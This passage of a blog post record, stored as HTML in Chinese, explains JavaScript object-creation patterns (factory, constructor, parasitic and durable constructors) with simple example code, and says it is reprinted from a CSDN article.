style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//\"wei\"</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person</span>函数创建了一个对象，并以相应的属性和方法初始化该对象，然后返回了这个对象。除了使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符把使用的包装函数叫做构造函数之外，这个模式和工厂模式并没有多大的区别。构造函数在不返回值的情况下，会默认返回新对象的实例。而通过在构造函数的末尾添加一个<span style=\"color: rgb(0, 128, 255);\">return</span>语句，可以重写调用构造函数时返回的值。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个模式可以在特殊的情况下来为对象创建构造函数。假设我们想创建一个具有额外方法的特殊数组。由于不能直接修改Array构造函数，因此可以使用这个模式：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">SpecialArray</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"><br> &nbsp; &nbsp;//创建数组</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br> &nbsp; &nbsp;var</span> values = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Array</span>(); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加值</span><br> &nbsp; &nbsp;values.push.apply(values,<span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">arguments</span>); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加方法</span><br> &nbsp; &nbsp;values.toPipedString = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>\n &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.join(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"|\"</span>);<br>} &nbsp; &nbsp;<br> <br> <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">&nbsp; &nbsp;//返回数组</span><br> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp;return</span> values;<br> }<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> colors = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> SpecialArray(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"red\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"blue\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"green\"</span>);<br>console.log(colors.toPipedString());<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//red|blue|green</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，我们创建了一个名为<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>的构造函数。在这个函数的内部，首先创建了一个数组，然后<span style=\"color: rgb(0, 128, 255);\">push()</span>方法初始化了数组的值。随后又给数组实例添加了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法，用来返回以竖线分隔的数组值。最后将数组以函数的形式返回。接着，我们调用了<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>构造函数，传入了初始化的值，并调用了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于寄生构造函数模式，有一点需要声明：首先，返回的对象与构造函数或者构造函数的原型没有任何关系；也就是说，构造函数返回的对象与在构造函数外部创建的对象没有什么不同。为此，不能依赖instanceof操作符来确定对象的类型。由于存在这一的问题，我们建议在可以使用其他模式的情况下不要使用这种模式。<br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>七、稳妥构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;道格拉斯·克拉克福德发明了JavaScript中的稳妥对象这个概念。所谓<span style=\"color: rgb(247, 92, 47);\"><strong>稳妥对象，是指没有公共属性，而且其方法也不引用this对象</strong></span>。稳妥对象最适合在一些安全环境中（这些环境会禁止使用this和new），或者在防止数据被其他应用程序改动时使用。稳妥构造函数遵循的与寄生构造函数类似的模式，但又两点不同：一是新创建对象的实例方法不引用this；二是不使用new操作符调用构造函数。按照稳妥构造函数的要求，可以将前面的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数重写如下：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;//创建要返回的新对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp; <br>&nbsp; &nbsp;var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>(); <br> &nbsp;<br><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;//可以在这里定义私有变量和函数 &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;//添加方法</span><br>&nbsp; &nbsp;o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>&nbsp;<br>&nbsp; &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;<br>&nbsp; &nbsp;}; &nbsp; &nbsp;<br><br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//返回对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br>&nbsp; &nbsp;return</span> o;<br> &nbsp; &nbsp;}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意，在以这种模式创建的对象中，除了使用<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法之外，没有其他办法访问<span style=\"color: rgb(0, 128, 255);\">name</span>的值。可以像下面使用稳妥的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person =Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"weiqi\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">22</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"banzhuan\"</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//weiqi</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样，变量<span style=\"color: rgb(0, 128, 255);\">person</span>中保存的是一个稳妥对象，而除了<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法外，没有别的方式可以访问其他数据成员。即使有其他代码会给这个对象添加方法或数据成员，但也不可能有别的办法访问传入到构造函数中的原始数据。稳妥构造函数模式提供的这种安全性，使得他非常适合在某些安全执行环境–例如，ADsafe(www.adsafe.org)提供的环境下使用。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: rgb(247, 92, 47);\"><strong>注意：与寄生构造函数模式类似，使用稳妥构造函数模式创建的对象与构造函数之间没有什么关系，因此instanceof操作符对这种对象也没有意义。</strong></span></span></p>\n \n>转自：http://blog.csdn.net/u014346301/article/details/52204967","source":"_posts/JavaScript创建对象的七种模式.md","raw":"---\ntitle: JavaScript创建对象的七种模式\ndate: 2016-10-11 13:16:14\ntags: Web\ncategories: Web\n---\n\n<section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ECMA-262把<span style=\"color: rgb(0, 128, 255);\">对象</span>定义为：”无需属性的集合，其属性可以包含基本值、对象或者函数。”严格来讲，这就相当于说明对象是一组没有特定顺序的值。对象的每个属性或方法都有一个名字，而每个名字都映射到一个值。正因为这样，我们可以把ECMAScript的对象想象成散列表：无非就是一组名对值，其中值可以是数据或函数。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义对象最简单的方式就是创建一个<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，然后再为他添加属性和方法，如下所示：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102);\">Object</span>();、</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.name = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">\"liubei\"</span>;</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.age = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 102, 102);\">29</span>;<br>person.job = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">\"shayemuyou\"</span>;<br><br>person.sayName = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 12px; color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp;<br>&nbsp; alert(<span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子创建了一个名为<span style=\"color: rgb(0, 128, 255);\">person</span>的对象，并为他添加了三个属性和一个方法。其中<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法用于显示name属性，<span style=\"color: rgb(0, 128, 255);\">this.name</span>将被解析为person.name，早期的开发人员经常使用这个模式来创建对象，后来对象字面量的方法成了创建对象的首选模式，上面的例子用对象字面量的语法可以写成如下这样：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = {\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;name:<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"liubei\"</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;age:<span class=\"\" style=\"color: rgb(0, 102, 102);\">29</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;job:<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"shayemuyou\"</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;sayName:<span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;}<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个例子中的<span style=\"color: rgb(0, 128, 255);\">person</span>对象和前面的对象是一样的，都有相同的属性和方法。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然<span style=\"color: rgb(0, 128, 255);\">Object</span>构造函数或者对象字面量的方法都可以用来创建单个对象，但是这些方法有个明显的缺点：使用同一个接口创建很多对象，会产生大量的重复代码。为了解决这个方法，人们开始使用工厂模式的一种变体。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47); font-size: 14px;\"><strong><span style=\"color: rgb(247, 92, 47);\">一、工厂模式</span></strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工厂模式是软件工程领域一种广为人知的设计模式，这种模式抽象了创建具体对象的过程</strong></span><span style=\"color: rgb(136, 136, 136);\">。考虑到ECMAScript中无法创建类，开发人员就发明了一种函数，用函数来封装以特定接口创建对象的细节，如下所示：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">createPerson</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span>\n <br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.name = name; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.age = age; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.job = job;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;<br>&nbsp; }<br> &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person1 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"software\"</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person2 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"bu\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"software\"</span>);</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;函数<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>能够根据接受的参数来构建一个包含所有必要信息的<span style=\"color: rgb(0, 128, 255);\">Person</span>对象。可以多次调用这个函数，每次都会返回一个包含三个属性一个方法的对象。工厂模式虽然解决了创建多个相似对象的问题，但却没有解决对象识别的问题，即怎么样知道这是哪个对象类型。</span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>二、构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;像Array、Object这样的原生构造函数，在运行时会自动出现在执行环境中。此外，我们可以创建自定义个构造函数，从而定义自定义类型的属性和方法。例如，我们可以使用构造函数重写上个例子：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{<span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;this</span>.name = name;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.age = age;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.job = job;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"software\"</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"bu\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"software\"</span>);</span></code></pre><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person()</span>函数取代了<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>函数，我们注意到<span style=\"color: rgb(0, 128, 255);\">Person()</span>与<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>的不同之处在于：</span></p><ul class=\"list-paddingleft-2\"><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有显式的创建对象</span></p></li><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">直接将属性和方法赋值给this对象</span></p></li><li><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有return语句&nbsp;</span></p></section></li></ul><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此外，还应该<span style=\"color: rgb(247, 92, 47);\"><strong>注意到函数名Person使用的是大写字母P</strong></span>。按照惯例，构造函数始终都应该以一个大写字母开头，而非构造函数则应该以一个小写字母开头。这个做法借鉴了其他OO语言，主要是为了区别于ECMAScript中的其他函数。因为构造函数本身也是函数，只不过可以创建对象而已。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要创建一个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例，必须使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符。以上这种方式会经过以下四个步骤：&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;1、创建一个新对象</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;2、将构造函数的作用域赋给新对象（因此this指向这个新对象）</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;3、执行构造函数中的代码</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;4、返回新对象&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前面例子的最后，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>分别保存着<span style=\"color: rgb(0, 128, 255);\">Person</span>的一个不同的实例。这两个对象都有一个constructor（构造函数）属性，该属性指向Person。如下：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; 